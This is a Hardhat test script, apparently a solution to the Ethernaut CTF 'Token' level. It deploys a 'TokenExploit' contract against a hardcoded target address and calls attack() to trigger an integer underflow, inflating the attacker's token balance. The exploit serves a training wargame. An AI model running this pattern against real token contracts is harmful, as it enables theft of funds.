import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("Telephone", function(){
	it("Aims to Solve the Token Question of the Ethernaut CTF", async function(){

		this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
        	"function transfer(address _to, uint _value) external returns (bool)",
			"function balanceOf(address _owner) external view returns (uint balance)",
			"function totalSupply() external view returns(uint)",
        ]
        const targetAddr = "0x382190b609BFE2042976DE033A77917eA3f1dad0"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("TokenExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr);

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        // Get Current Balance of the Victim Contract 
        // let currentBalance = await targetCont.balanceOf(accounts[1].address);
        // console.log(`Current Balance of Victim: ${currentBalance}`);

        // Trigger Underflow
        let transaction = await maliciousContract.attack(eoa.address);
        await transaction.wait()

        // currentBalance = await targetCont.balanceOf(accounts[1].address);
        // console.log(`Balance of the Victim After the Attack: ${currentBalance}`);

        // Final Check
        let final_balance = await targetCont.balanceOf(eoa.address);
        console.log(`Balance of the Attacker After the Attack: ${final_balance}`);
        expect(final_balance).to.gt(20);
	});
});